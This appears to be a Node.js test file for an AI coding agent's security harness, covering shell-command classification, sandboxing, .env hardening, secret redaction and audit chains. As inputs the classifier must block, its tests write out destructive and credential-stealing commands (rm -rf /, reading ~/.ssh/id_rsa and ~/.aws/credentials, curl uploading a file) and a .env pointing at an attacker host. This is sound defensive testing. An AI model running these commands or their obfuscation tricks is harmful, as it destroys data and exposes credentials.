import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { formatIgnoredDotEnvKeys, loadDotEnvIfPresent } from "../src/cli/dotenv.js";
import { detectSandbox, executionCommand, executionEnv, normalizeSandboxPolicy } from "../src/execution/sandbox.js";
import { classifyShellCommand } from "../src/permissions/shellPolicy.js";
import { buildSystemPrompt } from "../src/agent/prompt.js";
import { compactLiveMessages } from "../src/agent/loop.js";
import { runTask } from "../src/agent/taskRunner.js";
import { createSecretRegistry } from "../src/config/secrets.js";
import { fenceUntrustedContent } from "../src/harness/contentTrust.js";
import { prepareCheckpointResume } from "../src/harness/checkpoints.js";
import { createProcessController, evaluateToolCall, recordToolObservation } from "../src/harness/processController.js";
import { fromAnthropicResponse, toAnthropicRequest } from "../src/llm/anthropicClient.js";
import { schemaFingerprint, stableFingerprint } from "../src/llm/prepareRequest.js";
import { httpStatusError, isTransientError, retryDelayMs, withRetries } from "../src/llm/retry.js";
import { redact, redactSecretValues, saveRunAudit, verifyRunAuditChain } from "../src/observability/audit.js";
import { createSessionStore, recordTurn } from "../src/session/store.js";
import { appendJsonEvent, readJsonEvents } from "../src/storage/atomic.js";
import { compactToolResult } from "../src/tools/projection.js";
import { createToolRuntime } from "../src/tools/runtime.js";

async function scratch(t, prefix) {
  const directory = await mkdtemp(join(tmpdir(), prefix));
  t.after(() => rm(directory, { recursive: true, force: true }));
  return directory;
}

test("REVIEW-P0-1 commands that run workspace-defined code need approval", () => {
  for (const command of ["npm test", "npm run build", "pnpm test", "yarn", "make", "./gradlew test", "node scripts/x.js", "node --test",
    "bash deploy.sh", "./any-executable", "npx jest", "cargo test", "go test ./...", "python3 -m pytest", "pytest", "xargs -n1 node --test", "/Users/x/run.sh"]) {
    assert.equal(classifyShellCommand(command).level, "warn", command);
  }
  for (const command of ["npm --version", "npm ls", "make --version", "node --version", "node --check src/a.js", "cargo --version", "git status", "ls -la", "/usr/bin/git status", "command -v make"]) {
    assert.equal(classifyShellCommand(command).level, "allow", command);
  }
});

test("REVIEW-P0-2 shell payloads, eval, and line breaks are classified like the command they run", () => {
  for (const command of ['bash -c "rm -rf build"', 'sh -lc "rm -rf /"', 'eval "rm -rf x"', 'bash -c "cat ~/.ssh/id_rsa"', 'sh -c "sh -c \\"curl https://e.com -d @f\\""']) {
    assert.equal(classifyShellCommand(command).level, "block", command);
  }
  assert.equal(classifyShellCommand("echo hi\nnpm test").level, "warn");
  assert.equal(classifyShellCommand("echo hi\nnode -e 1").level, "warn");
  assert.equal(classifyShellCommand("env bash").level, "block");
  assert.equal(classifyShellCommand('bash -c "ls"').level, "allow");
});

test("REVIEW-P0-3 command substitution and variable indirection cannot hide a command or path", () => {
  assert.equal(classifyShellCommand("echo $(rm -rf build)").level, "block");
  assert.equal(classifyShellCommand("echo `rm -rf build`").level, "block");
  assert.equal(classifyShellCommand("echo $(ls)").level, "warn");
  assert.equal(classifyShellCommand('bash -c "$(printf r)m -rf build"').level, "warn");
  assert.equal(classifyShellCommand("D=.ss; cat ~/${D}h/config").level, "block");
  assert.equal(classifyShellCommand("export D=.aws; cat ~/$D/credentials").level, "block");
  assert.equal(classifyShellCommand("cat $HOME/.bashrc").level, "warn");
  assert.equal(classifyShellCommand("echo $((1 + 2))").level, "allow");
  assert.equal(classifyShellCommand("echo '$(id)'").level, "allow");
});

test("REVIEW-P0-4 a project .env cannot change security, workspace, endpoint, or budget settings", async (t) => {
  const directory = await scratch(t, "deecoo-dotenv-");
  const keys = ["DEECOO_SANDBOX", "DEECOO_SANDBOX_NETWORK", "DEECOO_PERMISSION_MODE", "DEECOO_EGRESS_ALLOWLIST", "DEECOO_BASE_URL", "DEECOO_CWD", "DEECOO_COST_BUDGET_USD", "DEECOO_MODEL", "DEEPSEEK_API_KEY"];
  const saved = Object.fromEntries(keys.map((key) => [key, process.env[key]]));
  for (const key of keys) delete process.env[key];
  t.after(() => { for (const [key, value] of Object.entries(saved)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; } });
  await writeFile(join(directory, ".env"), [
    "DEECOO_SANDBOX=off", "DEECOO_SANDBOX_NETWORK=allow", "DEECOO_PERMISSION_MODE=workspace-write", "DEECOO_EGRESS_ALLOWLIST=*",
    "DEECOO_BASE_URL=https://attacker.invalid", "DEECOO_CWD=/", "DEECOO_COST_BUDGET_USD=9999", "DEECOO_MODEL=deepseek-v4-flash", "DEEPSEEK_API_KEY=sk-project-key",
  ].join("\n"));
  const result = await loadDotEnvIfPresent(directory);
  for (const key of keys.slice(0, 7)) assert.equal(process.env[key], undefined, key);
  assert.equal(process.env.DEECOO_MODEL, "deepseek-v4-flash");
  assert.equal(process.env.DEEPSEEK_API_KEY, "sk-project-key");
  assert.deepEqual(result.ignored.sort(), keys.slice(0, 7).sort());
  assert.match(formatIgnoredDotEnvKeys(result), /DEECOO_SANDBOX.*cannot change security/);
});

test("REVIEW-P0-5 macOS xcrun tools such as git run inside the seatbelt sandbox", { skip: process.platform !== "darwin" || !existsSync("/usr/bin/git") || (!detectSandbox().available && process.env.DEECOO_REQUIRE_SANDBOX_TESTS !== "1") }, async (t) => {
  const cwd = await scratch(t, "deecoo-sandbox-git-");
  const temp = await scratch(t, "deecoo-sandbox-git-tmp-");
  const state = await scratch(t, "deecoo-sandbox-git-state-");
  // The repository is created outside the job: jobs may not create or rewrite .git/config.
  assert.equal(spawnSync("/usr/bin/git", ["init", "-q", "."], { cwd }).status, 0);
  const policy = normalizeSandboxPolicy({ mode: "required" }, cwd, state, temp);
  const command = executionCommand({ command: "/usr/bin/git --version && /usr/bin/git rev-parse --git-dir && /usr/bin/git status --short", cwd, policy, sandbox: detectSandbox() });
  assert.equal(command.sandbox.enforced, true);
  const result = spawnSync(command.executable, command.args, { cwd, encoding: "utf8", env: executionEnv(process.env, temp) });
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /git version/);
  assert.doesNotMatch(result.stderr, /sandbox blocked|couldn't create cache file/);
});

const answerReply = (content) => ({ choices: [{ message: { role: "assistant", content } }], usage: { total_tokens: 1 } });
const callReply = (id, name, args) => ({ choices: [{ message: { role: "assistant", tool_calls: [{ id, type: "function", function: { name, arguments: JSON.stringify(args) } }] } }], usage: { total_tokens: 1 } });

async function taskFixture(t) {
  const cwd = await scratch(t, "deecoo-review-task-");
  const previousHome = process.env.DEECOO_HOME;
  process.env.DEECOO_HOME = join(cwd, "session-home");
  t.after(() => { if (previousHome === undefined) delete process.env.DEECOO_HOME; else process.env.DEECOO_HOME = previousHome; });
  const sessionStore = await createSessionStore(cwd);
  const session = await sessionStore.createSession({ model: "test" });
  const tools = createToolRuntime({ cwd, permissionMode: "workspace-write", prompter: async () => true });
  return { cwd, sessionStore, session, tools };
}

test("REVIEW-P1-1 an explicit cost budget on an unpriced model refuses to start", async (t) => {
  const { cwd, sessionStore, session, tools } = await taskFixture(t);
  let calls = 0;
  const result = await runTask({ cwd, tools, sessionStore, session, task: "Analyze the project.",
    config: { model: "unpriced-model", quiet: true, stream: false, costBudgetUsd: 1 },
    client: { async chatCompletion() { calls += 1; return answerReply("done"); } } });
  assert.equal(calls, 0);
  assert.equal(result.status, "failed");
  assert.equal(result.error.code, "COST_BUDGET_UNPRICED");
});

test("REVIEW-P1-5 a run whose calls only repeat earlier observations stops as no_progress", async (t) => {
  const { cwd, sessionStore, session, tools } = await taskFixture(t);
  await writeFile(join(cwd, "a.js"), "export const a = 1;\n");
  let calls = 0;
  const result = await runTask({ cwd, tools, sessionStore, session, task: "Analyze a.js.",
    config: { model: "test", quiet: true, stream: false, maxSteps: 20 },
    client: { async chatCompletion() { calls += 1; return callReply("read-" + calls, "read_file", { path: "a.js" }); } } });
  assert.equal(result.stoppedReason, "no_progress");
  assert.ok(calls <= 6, `stopped after ${calls} model calls`);
});

test("REVIEW-P1-2 standard privacy keeps secret values out of session and checkpoint files", async (t) => {
  const cwd = await scratch(t, "deecoo-review-privacy-");
  const secret = "synthetic-secret-value-123456";
  const store = await createSessionStore(cwd, { rootDir: join(cwd, "home"), secretRegistry: createSecretRegistry({ SERVICE_API_KEY: secret }) });
  const session = await store.createSession({ model: "test" });
  await recordTurn(store, session, { user: "use " + secret + " and GITHUB_TOKEN=ghp_abcdefghijklmnop1234", assistant: "ok", model: "test" });
  await store.saveCheckpoint(session.id, { step: 1, metadata: { version: 1 }, messages: [{ role: "user", content: "key " + secret }] });
  const sessionText = await readFile(join(store.projectDir, session.id + ".json"), "utf8");
  const checkpointText = await readFile(join(store.projectDir, session.id + ".checkpoint.json"), "utf8");
  for (const text of [sessionText, checkpointText]) {
    assert.ok(!text.includes(secret));
    assert.ok(!text.includes("ghp_abcdefghijklmnop1234"));
  }
  assert.match(sessionText, /"user": "use \[redacted:SERVICE_API_KEY\]/);
});

test("REVIEW-P1-3 an oversized history drops its oldest turns instead of failing the save", async (t) => {
  const cwd = await scratch(t, "deecoo-review-history-");
  const store = await createSessionStore(cwd, { rootDir: join(cwd, "home"), maxFileBytes: 80_000 });
  const session = await store.createSession({ model: "test" });
  for (let index = 0; index < 30; index += 1) {
    await recordTurn(store, session, { user: `turn ${index}\nmust keep tabs in turn ${index}\n` + "u".repeat(1500), assistant: "a".repeat(1500), model: "test" });
  }
  const saved = await store.loadSession(session.id);
  assert.ok(saved.historyTrimmedTurns > 0);
  assert.equal(saved.history.at(-1).user.startsWith("turn 29"), true);
  assert.ok(Buffer.byteLength(await readFile(join(store.projectDir, session.id + ".json"))) <= 80_000);
  assert.ok(saved.trimmedHistoryConstraints.some((line) => /must keep tabs/.test(line)));
});

test("REVIEW-H-1 journal appends write only the new line", async (t) => {
  const directory = await scratch(t, "deecoo-review-journal-");
  const path = join(directory, "events.jsonl");
  for (let id = 1; id <= 3; id += 1) await appendJsonEvent(path, { id });
  assert.equal(await readFile(path, "utf8"), '{"id":1}\n{"id":2}\n{"id":3}\n');
  assert.equal(existsSync(path + ".bak"), false);
  await assert.rejects(appendJsonEvent(path, { id: 4, pad: "x".repeat(100) }, { maxBytes: 64 }), { code: "STORAGE_CAPACITY" });
  assert.deepEqual(await readJsonEvents(path), [{ id: 1 }, { id: 2 }, { id: 3 }]);
});

test("REVIEW-H-3 a resumed checkpoint restarts its phase and drops the old acceptance verdict", () => {
  const resumed = prepareCheckpointResume({ messages: [], workflow: { status: "executing", phase: "verifying", transitions: [] },
    acceptance: { status: "satisfied" }, verification: { status: "passed", evidence: [{ ok: true }] }, effects: { revision: 2, events: [] } });
  assert.equal(resumed.workflow.phase, "resumed");
  assert.equal(resumed.workflow.transitions.at(-1).from, "executing");
  assert.equal(resumed.acceptance, undefined);
  assert.equal(resumed.verification.status, "pending");
});

test("REVIEW-E-2 line ranges of one file are separate observations and never count as a full capture", () => {
  const controller = createProcessController();
  const first = { path: "big.js", startLine: 1, endLine: 100 };
  recordToolObservation(controller, { name: "read_file", args: first, result: { ok: true, content: "1-100", sourceComplete: false }, step: 1 });
  assert.equal(evaluateToolCall(controller, { name: "read_file", args: { path: "big.js", startLine: 500, endLine: 700 }, step: 2 }).action, "allow");
  assert.equal(evaluateToolCall(controller, { name: "read_file", args: { path: "big.js" }, step: 2 }).action, "allow");
  assert.equal(evaluateToolCall(controller, { name: "read_file", args: first, step: 2 }).action, "short_circuit");
});

test("REVIEW-E-3/E-4 projections keep arrays homogeneous and point truncated reads at the next line", () => {
  const listed = compactToolResult("search_text", { ok: true, matches: Array.from({ length: 85 }, (_, index) => `a.js:${index}:x`) });
  assert.equal(listed.matches.length, 80);
  assert.ok(listed.matches.every((item) => /^a\.js:/.test(item)));
  assert.deepEqual(listed.omittedItems, { matches: 5 });
  const content = Array.from({ length: 1000 }, (_, index) => `line ${index} ` + "y".repeat(40)).join("\n");
  const read = compactToolResult("read_file", { ok: true, path: "big.js", content, startLine: 1, endLine: 1000 });
  assert.equal(read.projectionTruncated, true);
  assert.ok(read.nextStartLine > 1 && read.nextStartLine < 1000);
  assert.equal(read.endLine, read.nextStartLine - 1);
});

test("REVIEW-C-1 a second compaction keeps the output references of the first", () => {
  const ref = "out_" + "a".repeat(32);
  const messages = [{ role: "system", content: "system" }, { role: "user", content: "task" },
    { role: "user", content: fenceUntrustedContent("context-compaction", "Run state summary\nRetained output references: outputRef=" + ref).text }];
  for (let index = 0; index < 12; index += 1) {
    messages.push({ role: "assistant", content: "", tool_calls: [{ id: "c" + index, type: "function", function: { name: "read_file", arguments: "{}" } }] },
      { role: "tool", tool_call_id: "c" + index, content: JSON.stringify({ ok: true, content: "x".repeat(2000) }) });
  }
  assert.equal(compactLiveMessages(messages, { protectedPrefixCount: 2, maxChars: 8000 }), true);
  const summaries = messages.filter((message) => message.role === "user" && message.content.includes('source="context-compaction"'));
  assert.equal(summaries.length, 1);
  assert.match(summaries[0].content, new RegExp("outputRef=" + ref));
});

test("REVIEW-M-1 text redaction hides credential values without erasing code identifiers", () => {
  const code = "const promptTokens = Number(usage?.promptTokens ?? 0);\nconst tokenBudget = config.tokenBudget; max_tokens: 4096";
  assert.equal(redact(code, { maxTextChars: Infinity }), code);
  assert.equal(redact("GITHUB_TOKEN=ghp_abcdefghijklmnop1234", { maxTextChars: Infinity }), "GITHUB_TOKEN=[REDACTED]");
  assert.equal(redact('"access_token": "eyJhbGciOiJIUzI1NiJ9.e30.abc"', { maxTextChars: Infinity }), '"access_token": "[REDACTED]"');
  assert.deepEqual(redactSecretValues({ maxTokens: 10, note: "DB_PASSWORD=hunter2hunter2hunter2" }), { maxTokens: 10, note: "DB_PASSWORD=[REDACTED]" });
});

test("REVIEW-M-2 run audits form a verifiable hash chain", async (t) => {
  const projectDir = await scratch(t, "deecoo-review-audit-");
  const store = { projectDir };
  const session = { id: "12345678-1234-1234-1234-123456789abc" };
  const first = await saveRunAudit(store, session, { task: "one" });
  await saveRunAudit(store, session, { task: "two" });
  assert.deepEqual(await verifyRunAuditChain(store, session), { ok: true, records: 2, legacyRecords: 0, firstSequence: 1 });
  const tampered = JSON.parse(await readFile(first.path, "utf8"));
  tampered.task = "edited";
  await writeFile(first.path, JSON.stringify(tampered));
  assert.equal((await verifyRunAuditChain(store, session)).reason, "digest-mismatch");
});

test("REVIEW-O-3 provider retries honor Retry-After, report attempts, and never retry local errors", async () => {
  const headers = new Headers({ "retry-after": "2" });
  const error = httpStatusError({ status: 429, headers }, "API error 429");
  assert.equal(error.retryAfterMs, 2000);
  assert.equal(retryDelayMs(error, 1), 2000);
  assert.equal(isTransientError(Object.assign(new Error("EPERM: operation not permitted, mkdtemp"), { code: "EPERM" })), false);
  let attempts = 0;
  const failure = await withRetries({ attempts: 3, timeoutMs: 1000 }, async () => { attempts += 1; throw Object.assign(new Error("API error 503"), { status: 503, retryAfterMs: 0 }); }).catch((caught) => caught);
  assert.equal(attempts, 3);
  assert.equal(failure.attempts, 3);
});

test("REVIEW-O-2/O-4 skill routing stays out of generic prompts and schema fingerprints are stable", () => {
  assert.doesNotMatch(buildSystemPrompt("/w", "general", []), /S-COR/);
  assert.match(buildSystemPrompt("/w", "general", [{ name: "post-cor", sourceLabel: "skill", relativePath: "post-cor/SKILL.md", summary: "", content: "" }]), /S-COR handoff/);
  const tools = [{ type: "function", function: { name: "read_file", parameters: { type: "object", properties: { path: { type: "string" } } } } }];
  assert.equal(schemaFingerprint(tools), stableFingerprint(tools));
  assert.equal(schemaFingerprint(structuredClone(tools)), schemaFingerprint(tools));
});

test("REVIEW-P1-4 npm run eval executes the E2E suite by default", async () => {
  const scripts = JSON.parse(await readFile(new URL("../package.json", import.meta.url), "utf8")).scripts;
  assert.match(scripts.eval, /--execute/);
  assert.match(scripts["eval:trace"], /--trace/);
});

test("REVIEW-cache Anthropic requests use automatic prompt caching and count cached prompt tokens", () => {
  const request = toAnthropicRequest({ model: "claude-opus-5-5", messages: [{ role: "system", content: "S" }, { role: "user", content: "U" }] });
  assert.deepEqual(request.cache_control, { type: "ephemeral" });
  const response = fromAnthropicResponse({ content: [{ type: "text", text: "ok" }], stop_reason: "end_turn",
    usage: { input_tokens: 10, cache_read_input_tokens: 900, cache_creation_input_tokens: 50, output_tokens: 5 } });
  assert.equal(response.usage.prompt_tokens, 960);
  assert.equal(response.usage.cache_read_input_tokens, 900);
});
